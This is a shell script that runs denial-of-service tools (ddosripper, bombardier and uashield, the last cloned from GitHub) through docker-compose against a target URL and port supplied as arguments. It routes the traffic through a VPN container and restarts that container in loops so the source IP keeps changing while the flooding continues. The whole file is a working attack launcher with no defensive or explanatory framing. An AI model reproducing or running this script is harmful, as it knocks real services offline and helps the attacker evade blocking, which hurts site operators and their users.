#!/bin/sh

init(){
    export VPN_USER=$3
    export VPN_CODE=$4
    export VPN_COUNTRY=$6
    export VPN_TYPE=$5
    export VPN_SERVER_HOSTNAMES=$7
    export VPN_PROTOCOL=${8:-udp}
    export TARGET_PORT=$2
    export R_TARGET_URL=$1
    export RUN_RIPPER=1
    scheme="http://"
    updSuffix=""
    if [ "$TARGET_PORT" -eq "443" ]
    then
        scheme="https://"
    fi
    if [ "$TARGET_PORT" -eq "53" ]
    then
        RUN_RIPPER=0
        scheme=""
        updSuffix="/UDP"
    fi
    export B_TARGET_URL="$scheme$R_TARGET_URL:$TARGET_PORT$updSuffix"
    sudo git pull
}
start_vpn(){
    sudo -E docker-compose down
    sudo -E docker-compose up -d --force-recreate vpn
    sleep 10s
    sudo docker logs $(sudo docker-compose ps -q vpn)
    sudo -E docker-compose run test
}
kali(){
    start_vpn
    sudo -E docker-compose run -d kali
}
change_ip(){
    sudo -E docker-compose run --rm --entrypoint "curl http://0.0.0.0:8000/openvpn/actions/restart" test
    echo "IP changed"
    sudo -E docker-compose run --rm test
}
runAll(){
    start_vpn
    echo "Executing..."
    if [ $RUN_RIPPER -eq 1 ]
    then
        sudo -E docker-compose run -d ddosripper
    fi
    sleep 10s
    echo "Logs:"
    sudo docker logs --since 20s $(sudo docker-compose ps -q ddosripper)
    for i in {1..60}
    do
        echo "Running all $i time. U=$VPN_USER C=$VPN_CODE C=$VPN_COUNTRY $B_TARGET_URL $R_TARGET_URL"
        sudo -E docker-compose run -d --rm bombardier
        sleep 120s
        change_ip
        echo "Logs:"
        sudo docker logs --since 30s $(sudo docker-compose ps -q ddosripper)
    done
}
run(){
    tool=$1
    start_vpn
    sudo -E docker-compose run -d $tool
    echo "Executing $tool..."
    sleep 10s
    for i in {1..60}
    do
        echo "Logs:"
        sudo docker logs --since 60s $(sudo docker-compose ps -q $tool)
        for j in {1..10}
        do
            sleep 30s
            sudo docker logs --since 5s $(sudo docker-compose ps -q $tool)
        done
        change_ip
        sudo -E docker-compose run --rm test
    done
}
uashield() {
    DIR="/runner/uashield/"
    if [ -d "$DIR" ]; then
        echo "Updating uashield"
        cd $DIR
        sudo git pull
        cd /runner
        #sudo docker-compose build uashield
    else
        echo "downloading uashield"
        sudo git clone https://github.com/opengs/uashield.git $DIR
    fi
    run "uashield"
}
bombardier()
{
    run "bombardier"
}
ddosripper()
{
    run "ddosripper"
}
checksites(){
    run "checksites"
}
sudo chmod u+x ddosripper/docker_entrypoint.sh